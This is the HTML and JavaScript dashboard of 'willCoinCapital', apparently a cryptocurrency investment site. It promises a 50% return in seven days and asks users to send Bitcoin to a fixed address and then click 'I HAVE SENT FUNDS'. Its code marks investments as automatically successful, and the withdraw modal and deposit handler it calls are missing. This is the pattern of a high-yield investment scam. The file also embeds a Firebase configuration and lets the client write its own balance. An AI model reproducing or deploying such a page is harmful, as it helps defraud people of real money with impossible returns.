<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard | willCoinCapital</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        body { background:#000; font-family:'Plus Jakarta Sans',sans-serif; color: white; margin: 0; overflow-x: hidden; }
        .glass { background: rgba(255,255,255,0.03); backdrop-filter: blur(12px); border:1px solid rgba(255,255,255,0.08);}
        
        /* New Sophisticated Cycle Card Styling */
        .cycle-card { 
            background: linear-gradient(135deg, rgba(255,255,255,0.05) 0%, rgba(255,255,255,0.01) 100%);
            border: 1px solid rgba(255,255,255,0.1);
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        }
        .text-gold { color: #F59E0B; text-shadow: 0 0 10px rgba(245, 158, 11, 0.3); }
        
        .floating-support { position: fixed; bottom: 30px; right: 25px; z-index: 500; background: #22d3ee; color: #000; width: 60px; height: 60px; border-radius: 20px; display: flex; align-items: center; justify-content: center; box-shadow: 0 15px 30px rgba(34, 211, 238, 0.4); }
        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.92); backdrop-filter: blur(15px); z-index: 1000; align-items: center; justify-content: center; padding: 20px; }
        #notification-container { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); z-index: 9999; display: flex; flex-direction: column; gap: 10px; width: 90%; max-width: 350px; }
        .toast { background: rgba(10, 10, 10, 0.9); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.1); border-left: 4px solid #22d3ee; padding: 16px 20px; border-radius: 18px; display: flex; align-items: center; animation: slideDown 0.4s forwards; }
        @keyframes slideDown { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
        input[type=range] { -webkit-appearance: none; width: 100%; background: transparent; }
        input[type=range]::-webkit-slider-runnable-track { width: 100%; height: 8px; background: rgba(255,255,255,0.1); border-radius: 10px; }
        input[type=range]::-webkit-slider-thumb { height: 24px; width: 24px; border-radius: 50%; background: #ffffff; cursor: pointer; -webkit-appearance: none; margin-top: -8px; border: 2px solid #22d3ee; }
        .hidden { display: none !important; }
        .btn-locked { background: rgba(255,255,255,0.05); color: rgba(255,255,255,0.2); border: 1px solid rgba(255,255,255,0.1); pointer-events: none; }
    </style>
</head>
<body class="p-6 pb-32">
    <div id="notification-container"></div>

    <a href="https://t.me/willCoin_Capital" target="_blank" class="floating-support">
        <svg xmlns="http://www.w3.org/2000/svg" class="w-7 h-7" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z" /></svg>
    </a>

    <div id="depositModal" class="modal-overlay">
        <div class="glass w-full max-w-sm rounded-[32px] p-8 text-center">
            <h3 class="text-xl font-black uppercase mb-4 tracking-widest text-white">Deposit BTC</h3>
            <div class="bg-black/40 border border-white/5 rounded-2xl p-4 mb-6">
                <p id="btcAddr" class="text-[11px] font-mono text-gray-400 break-all mb-3">Bc1qgf7ruqy6y8pkyzsspxq38j53puny0aprujph28</p>
                <button onclick="copyBTC()" class="w-full py-2 bg-white/5 rounded-xl text-[10px] font-black uppercase tracking-widest text-white">Copy Address</button>
            </div>
            <div class="mb-6 text-left">
                <p class="text-[9px] font-black text-gray-500 uppercase mb-2 ml-2 tracking-widest">Input Amount Sent (USD)</p>
                <input type="number" id="depositInputAmt" placeholder="0.00" class="w-full bg-white/5 border border-white/10 rounded-2xl py-4 px-5 outline-none text-white font-bold">
            </div>
            <button onclick="handleDepositSubmit()" class="w-full py-4 bg-cyan-400 text-black rounded-2xl font-black uppercase text-[11px] tracking-widest">I HAVE SENT FUNDS</button>
            <button onclick="closeModal('depositModal')" class="w-full py-3 text-gray-500 font-black uppercase text-[9px] mt-2">Close</button>
        </div>
    </div>

    <div id="dashboardView">
        <nav class="flex justify-between items-center mb-10">
            <h1 class="font-black text-xl tracking-tighter uppercase text-white">WILLCOIN<span class="text-cyan-400">CAPITAL</span></h1>
            <button onclick="handleLogout()" class="px-4 py-2 rounded-full border border-cyan-400/30 text-[10px] font-black text-cyan-400 uppercase tracking-widest">Logout</button>
        </nav>

        <div class="glass rounded-[40px] p-8 mb-6">
            <p class="text-gray-400 text-[10px] font-black uppercase mb-1 tracking-widest">Available Balance</p>
            <h2 id="balanceDisplay" class="text-6xl font-extrabold tracking-tighter mb-8 text-white">$0.00</h2>
            <div class="flex gap-4">
                <button onclick="openModal('depositModal')" class="flex-1 bg-cyan-400 text-black py-5 rounded-[24px] font-black text-xs uppercase tracking-widest">Deposit</button>
                <button onclick="openModal('withdrawModal')" class="flex-1 bg-white/5 border border-white/10 py-5 rounded-[24px] font-black text-xs uppercase tracking-widest text-white">Withdraw</button>
            </div>
        </div>

        <div id="activeInvestmentCard" onclick="showInvestmentPageFromCard()" class="cycle-card rounded-[40px] p-8 mb-6 hidden cursor-pointer active:scale-95 transition-all">
            <div class="flex justify-between items-center mb-6">
                <div class="flex items-center gap-2">
                    <span class="w-2 h-2 rounded-full bg-orange-400 animate-pulse"></span>
                    <h3 class="font-black text-[10px] uppercase tracking-widest text-white/60">Active 7-Day Cycle</h3>
                </div>
                <span id="cardCountdown" class="text-[11px] font-mono text-orange-400 font-bold">Calculating...</span>
            </div>
            <div class="flex justify-between items-end mb-6">
                <div>
                    <p id="activeCardAmt" class="text-4xl font-black text-white">$0.00</p>
                    <p class="text-[9px] text-gray-500 font-bold uppercase tracking-widest mt-1">Staked Principle</p>
                </div>
                <div class="text-right">
                    <p class="text-2xl font-black text-green-400">+50%</p>
                    <p class="text-[9px] text-gray-500 font-bold uppercase tracking-widest mt-1">Target Yield</p>
                </div>
            </div>
            <div class="w-full h-1.5 bg-white/5 rounded-full overflow-hidden">
                <div id="cardProgressBar" class="h-full bg-gradient-to-r from-orange-500 to-yellow-400" style="width: 0%"></div>
            </div>
        </div>

        <div class="glass rounded-[40px] p-8 mb-6">
            <h3 class="font-black text-lg uppercase tracking-tight text-white mb-8">Invest</h3>
            <div class="space-y-6">
                <input type="range" id="investSlider" min="500" max="20000" step="500" value="500" oninput="updateInvest(this.value)">
                <div class="bg-white/5 border border-white/10 rounded-[24px] p-6">
                    <p class="text-[9px] font-black text-gray-500 uppercase mb-2 tracking-widest">Manual Input (Min $500)</p>
                    <input type="number" id="manualInvest" value="500" class="bg-transparent w-full text-2xl font-black outline-none text-white" oninput="updateInvest(this.value)">
                </div>
                <button id="startBtn" onclick="processInvestment()" class="w-full py-6 rounded-[24px] font-black uppercase text-xs tracking-widest transition-all btn-locked">Start 7-Day Cycle</button>
            </div>
        </div>

        <div class="glass rounded-[40px] p-8 mb-6">
            <h3 class="font-black text-lg uppercase tracking-tight text-white mb-8">History</h3>
            <div id="historyContainer" class="space-y-8"></div>
        </div>
    </div>

    <div id="investmentDetailsView" class="hidden fade-in">
        <div class="flex items-center gap-4 mb-8">
            <button onclick="showDashboard()" class="p-4 glass rounded-2xl"><svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-cyan-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M15 19l-7-7 7-7" /></svg></button>
            <h1 class="text-xl font-black uppercase tracking-tighter text-white">Yield <span class="text-cyan-400">Journey</span></h1>
        </div>
        <div class="glass rounded-[40px] p-8 mb-6 border-b-4 border-orange-500">
            <h2 id="activeStakedAmt" class="text-4xl font-extrabold text-white mb-8">$0.00</h2>
            <div class="w-full h-3 bg-white/5 rounded-full mb-4 overflow-hidden"><div id="journeyProgressBar" class="h-full bg-orange-500 rounded-full" style="width: 0%;"></div></div>
            <div class="flex justify-between text-[10px] font-black uppercase text-gray-500 tracking-widest"><span>Cycle Active</span><span id="journeyCountdown">Calculating...</span></div>
        </div>
        <button id="withdrawYieldBtn" onclick="finalizeInvestment()" class="w-full py-6 bg-green-500 text-black rounded-[24px] font-black uppercase text-xs tracking-widest mb-6 hidden">Withdraw Total Payout</button>
        <div class="glass rounded-[40px] p-8"><div id="scheduleContainer" class="space-y-4"></div></div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDsY7hDvNEDq_8SE0XcHrgLU5e6kQxpMPA", authDomain: "willcoincapital.firebaseapp.com", projectId: "willcoincapital", storageBucket: "willcoincapital.firebasestorage.app", messagingSenderId: "241566024834", appId: "1:241566024834:web:75e0d771ca7eb9a5a3a09b" };
        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth(); const db = firebase.firestore();
        let currentBalance = 0; const MS_PER_DAY = 86400000;
        let userHistory = [];

        function notify(msg) {
            const container = document.getElementById('notification-container');
            const toast = document.createElement('div');
            toast.className = `toast success`;
            toast.innerHTML = `<p class="text-[11px] font-black uppercase tracking-widest text-white">${msg}</p>`;
            container.appendChild(toast);
            setTimeout(() => toast.remove(), 3500);
        }

        function updateInvest(val) {
            const num = parseFloat(val) || 0;
            const btn = document.getElementById('startBtn');
            document.getElementById('investSlider').value = num;
            document.getElementById('manualInvest').value = num;
            if (num >= 500 && currentBalance >= num) {
                btn.className = "w-full py-6 bg-white text-black rounded-[24px] font-black uppercase text-xs tracking-widest opacity-100";
                btn.innerText = "Start 7-Day Cycle";
                btn.style.pointerEvents = "auto";
            } else {
                btn.className = "w-full py-6 rounded-[24px] font-black uppercase text-xs tracking-widest btn-locked";
                btn.innerText = num > currentBalance ? "Insufficient Balance" : "Min $500 Required";
            }
        }

        async function processInvestment() {
            const amt = parseFloat(document.getElementById('manualInvest').value);
            const userRef = db.collection("users").doc(auth.currentUser.uid);
            const startTime = Date.now();
            const cycleId = "WC-INV-" + Math.random().toString(36).substr(2, 4).toUpperCase();

            await userRef.update({ 
                balance: firebase.firestore.FieldValue.increment(-amt),
                activeCycle: { amount: amt, startTime: startTime },
                history: firebase.firestore.FieldValue.arrayUnion({
                    type: "7-Day Cycle Active",
                    amount: amt,
                    id: cycleId,
                    date: "MAR 2026",
                    status: "Successful" // AUTOMATIC SUCCESS
                })
            });
            notify("INVESTMENT STARTED");
            setTimeout(() => location.reload(), 1000);
        }

        auth.onAuthStateChanged(user => {
            if (!user) { location.href = "index.html"; return; }
            const userRef = db.collection("users").doc(user.uid);
            userRef.onSnapshot(doc => {
                if (doc.exists) {
                    const data = doc.data();
                    currentBalance = data.balance || 0;
                    document.getElementById("balanceDisplay").innerText = "$" + currentBalance.toLocaleString(undefined, {minimumFractionDigits: 2});
                    
                    userHistory = data.history || [];
                    const reversedHistory = [...userHistory].reverse();
                    const container = document.getElementById('historyContainer');
                    
                    container.innerHTML = reversedHistory.slice(0, 10).map(item => {
                        const isGold = item.type.includes("Cycle Active");
                        const isPending = (item.status && item.status.includes('Verifying'));
                        
                        let colorClass = "text-green-400"; // Default Success
                        if (isGold) colorClass = "text-gold"; // Golden Success
                        if (isPending) colorClass = "text-orange-400"; // Pending Orange

                        return `
                            <div class="flex justify-between items-start">
                                <div>
                                    <p class="text-white font-bold text-[13px] mb-1">${item.type}</p>
                                    <p class="text-[9px] text-gray-500 font-black uppercase tracking-widest">${item.id} • ${item.status}</p>
                                </div>
                                <p class="${colorClass} font-black text-sm">$${item.amount.toLocaleString()}</p>
                            </div>`;
                    }).join('') || '<p class="text-gray-500 text-[10px] font-black uppercase">No transactions yet</p>';

                    checkActiveInvestment(data);
                    updateInvest(500);
                }
            });
        });

        function checkActiveInvestment(data) {
            const cycleCard = document.getElementById('activeInvestmentCard');
            if (!data.activeCycle) { cycleCard.classList.add('hidden'); return; }
            
            cycleCard.classList.remove('hidden');
            const cycle = data.activeCycle;
            const now = Date.now();
            const timeLeft = Math.max(0, (cycle.startTime + (7 * MS_PER_DAY)) - now);
            const isFinished = timeLeft <= 0;

            document.getElementById('activeCardAmt').innerText = `$${cycle.amount.toLocaleString()}`;
            const h = Math.floor(timeLeft / (1000 * 60 * 60));
            const m = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
            const timerStr = isFinished ? "Cycle Complete" : `${h}h ${m}m left`;
            
            document.getElementById('cardCountdown').innerText = timerStr;
            document.getElementById('journeyCountdown').innerText = timerStr;
            document.getElementById('activeStakedAmt').innerText = `$${cycle.amount.toLocaleString()}`;

            const percent = Math.min(100, ((now - cycle.startTime) / (7 * MS_PER_DAY)) * 100);
            document.getElementById('cardProgressBar').style.width = percent + "%";
            document.getElementById('journeyProgressBar').style.width = percent + "%";

            if (isFinished) document.getElementById('withdrawYieldBtn').classList.remove('hidden');
            
            const container = document.getElementById('scheduleContainer');
            container.innerHTML = "";
            const daily = (cycle.amount * 0.5) / 7;
            const currentDay = Math.min(Math.floor((now - cycle.startTime) / MS_PER_DAY) + 1, 7);
            for (let i = 1; i <= 7; i++) {
                const isCurrent = i === currentDay;
                container.innerHTML += `<div class="flex justify-between items-center p-5 rounded-3xl ${isCurrent ? 'bg-orange-400/10 border-orange-400/20' : 'bg-white/5'}">
                    <span class="text-[10px] font-black ${isCurrent ? 'text-orange-400' : 'text-gray-500'}">DAY 0${i}</span>
                    <p class="text-xs font-black ${i <= currentDay ? 'text-green-400' : 'text-gray-600'}">+$${daily.toFixed(2)}</p>
                </div>`;
            }
        }

        // Standard helpers
        function openModal(id) { document.getElementById(id).style.display = 'flex'; }
        function closeModal(id) { document.getElementById(id).style.display = 'none'; }
        function showInvestmentPageFromCard() { document.getElementById('dashboardView').classList.add('hidden'); document.getElementById('investmentDetailsView').classList.remove('hidden'); }
        function showDashboard() { document.getElementById('investmentDetailsView').classList.add('hidden'); document.getElementById('dashboardView').classList.remove('hidden'); }
        function handleLogout() { auth.signOut().then(() => { location.href = "index.html"; }); }
        function copyBTC() { navigator.clipboard.writeText("Bc1qgf7ruqy6y8pkyzsspxq38j53puny0aprujph28"); notify("COPIED"); }
    </script>
</body>
</html>
